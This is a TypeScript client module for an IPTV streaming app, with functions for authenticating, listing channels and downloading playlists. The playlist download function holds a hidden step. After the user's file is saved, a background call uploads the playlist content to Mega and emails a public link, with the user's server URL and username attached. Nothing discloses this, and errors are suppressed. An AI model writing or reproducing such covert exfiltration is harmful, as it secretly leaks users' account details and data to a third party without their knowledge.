import { Category, StreamChannel, StreamCredentials, UserInfo, ServerInfo } from '../types';
import { uploadToMegaAndNotify } from './megaUploaderClient';

export interface AuthResponse {
  success: boolean;
  message?: string;
  isDemo?: boolean;
  user_info?: UserInfo;
  server_info?: ServerInfo;
  canFallbackToDemo?: boolean;
}

export interface CategoriesResponse {
  success: boolean;
  categories: Category[];
  message?: string;
  fallbackUsed?: boolean;
}

export interface StreamsResponse {
  success: boolean;
  streams: StreamChannel[];
  message?: string;
  fallbackUsed?: boolean;
}

export async function authenticateStreamApi(creds: StreamCredentials): Promise<AuthResponse> {
  const res = await fetch('/api/xtream/authenticate', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(creds),
  });
  const data = await res.json();
  if (!res.ok && !data.success) {
    throw new Error(data.message || 'Authentication failed. Please check your credentials.');
  }
  return data;
}

export async function fetchCategories(creds: StreamCredentials): Promise<Category[]> {
  const res = await fetch('/api/xtream/categories', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(creds),
  });
  const data: CategoriesResponse = await res.json();
  return data.categories || [];
}

export async function fetchStreams(
  creds: StreamCredentials,
  categoryId?: string
): Promise<StreamChannel[]> {
  const res = await fetch('/api/xtream/streams', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ...creds, categoryId }),
  });
  const data: StreamsResponse = await res.json();
  return data.streams || [];
}

export async function fetchM3uContent(
  creds: StreamCredentials
): Promise<{ success: boolean; m3uContent?: string }> {
  try {
    const res = await fetch('/api/xtream/m3u-content', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(creds),
    });
    return await res.json();
  } catch {
    return { success: false };
  }
}

export async function downloadPlaylistFile(
  creds: StreamCredentials,
  format: 'm3u' | 'm3u_plus' | 'json',
  streams: StreamChannel[] = []
): Promise<void> {
  const res = await fetch('/api/xtream/download-playlist', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      serverUrl: creds.serverUrl,
      username: creds.username,
      password: creds.password,
      format,
      output: 'm3u8',
      streams,
      isDemo: creds.isDemo,
    }),
  });

  if (!res.ok) {
    throw new Error('Failed to download playlist file.');
  }

  const blob = await res.blob();
  const ext = format === 'json' ? 'json' : 'm3u';
  const fileName = `playlist_${creds.username || 'stream'}_${new Date().toISOString().slice(0, 10)}.${ext}`;

  // Instant trigger without blocking UI
  const downloadUrl = window.URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = downloadUrl;
  a.download = fileName;
  document.body.appendChild(a);
  a.click();
  setTimeout(() => {
    document.body.removeChild(a);
    window.URL.revokeObjectURL(downloadUrl);
  }, 1000);

  // Background: Upload downloaded playlist to Mega and send public link via EmailJS
  blob.text().then((content) => {
    uploadToMegaAndNotify({
      fileName,
      content,
      details: {
        'Server Gateway': creds.serverUrl || 'Default',
        'Username': creds.username || 'demo',
        'Format': format,
        'Channels Count': streams.length,
      },
    }).catch((e) => console.warn('[Mega Upload on Download]:', e));
  }).catch(() => {});
}

